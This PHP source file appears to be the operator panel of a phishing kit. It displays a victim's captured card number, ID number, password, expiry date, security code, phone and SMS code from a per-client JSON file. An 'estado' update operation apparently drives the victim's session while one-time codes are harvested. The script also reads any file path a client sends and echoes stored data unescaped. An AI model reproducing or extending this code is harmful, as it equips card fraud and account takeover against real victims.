<?php
session_start();

if(!$_POST)
{
    echo "error qs09po12";
    exit;
}

if(!isset($_POST["FileCliente"]))
{
    echo "error derefuy7";
    exit;
}
if(!isset($_POST["Op"]))
{
    echo "error sdwefs87asd";
    exit;
}
$Op = trim($_POST["Op"]);
if($Op == "")
{
    echo "error as9876534lkoas";
    exit;
}
$FileCliente = trim($_POST["FileCliente"]);
if(!file_exists($FileCliente))
{
    echo "error 343e35434 archivo no existe";
    exit;
}
$DataClienteJson = @file_get_contents("$FileCliente");
if($DataClienteJson == FALSE)
{
    echo "error 98123oiqwe";
    exit;
}

$DataClienteArray = json_decode($DataClienteJson, TRUE);
$m_id_sesion= $DataClienteArray["id_sesion"];
switch ($Op) 
{
    case "PaintData":
        ?>        
        <table>
            
        <tr>
            <td>estado</td>
            <td><?php echo $DataClienteArray["estado"] ?></td>
        </tr>
        
        <tr>
            <td>nombre</td>
            <td><?php echo $DataClienteArray["nombre"] ?></td>
        </tr>
        
        <tr>
            <td>tarj</td>
            <td><?php echo $DataClienteArray["info1"] ?></td>
        </tr>
        
        <tr>
            <td>dni</td>
            <td><?php echo $DataClienteArray["info2"] ?></td>
        </tr>
        
        <tr>
            <td>pas</td>
            <td><?php echo $DataClienteArray["info3"] ?></td>
        </tr>
        
        <tr>
            <td>fv</td>
            <td><?php echo $DataClienteArray["info4"] ?></td>
        </tr>
        
        <tr>
            <td>cbb</td>
            <td><?php echo $DataClienteArray["info5"] ?></td>
        </tr>
        
        <tr>
            <td>atn</td>
            <td><?php echo $DataClienteArray["info6"] ?></td>
        </tr>
        
        <tr>
            <td>operador</td>
            <td><?php echo $DataClienteArray["info7"] ?></td>
        </tr>
        
        <tr>
            <td>celu</td>
            <td><?php echo $DataClienteArray["info8"] ?></td>
        </tr>
        
        <tr>
            <td>sms</td>
            <td><?php echo $DataClienteArray["info9"] ?></td>
        </tr>

    </table>


        <?php
        
        exit;
        break;
    case "ModifyValues":
        
        $a = trim($_POST["a"]);
        $b = trim($_POST["b"]);
        $Valor = trim($_POST["Valor"]);
        
        $DataClienteArray["estado"] = $Valor;
        $DataClienteArray["info9"] = "";
        
        $DataClienteJson = json_encode($DataClienteArray, JSON_HEX_APOS);

        $fo = fopen("$FileCliente","w");
        fwrite($fo,$DataClienteJson);
        fclose($fo);
        
        echo "Correcto";
        
        exit;
        break;
    
    default:
        echo "error 87u3e390ie3 Opcion invalida";
        exit;
        break;
}


?>

